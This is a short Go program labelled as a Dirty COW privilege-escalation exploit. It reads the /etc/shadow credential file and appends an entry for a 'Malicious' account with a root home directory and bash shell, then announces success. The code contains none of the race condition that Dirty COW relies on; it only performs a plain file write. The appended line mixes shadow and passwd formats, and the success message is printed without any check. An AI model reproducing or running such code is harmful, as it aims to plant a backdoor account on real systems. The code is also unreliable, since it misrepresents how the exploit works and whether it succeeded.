

package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	// File path to the target file with read-only permissions
	targetFilePath := "/etc/shadow"

	// Read the content of the target file
	content, err := ioutil.ReadFile(targetFilePath)
	if err != nil {
		fmt.Println("Error reading target file:", err)
		return
	}

	// Modify the content (exploiting Dirty COW)
	modifiedContent := append(content, []byte("\nMaliciousData:123456:17321:0:0:Malicious:/root:/bin/bash")...)

	// Write the modified content back to the target file
	err = ioutil.WriteFile(targetFilePath, modifiedContent, os.ModeAppend)
	if err != nil {
		fmt.Println("Error writing to target file:", err)
		return
	}

	fmt.Println("Exploit successful. Check the target file for modifications.")
}
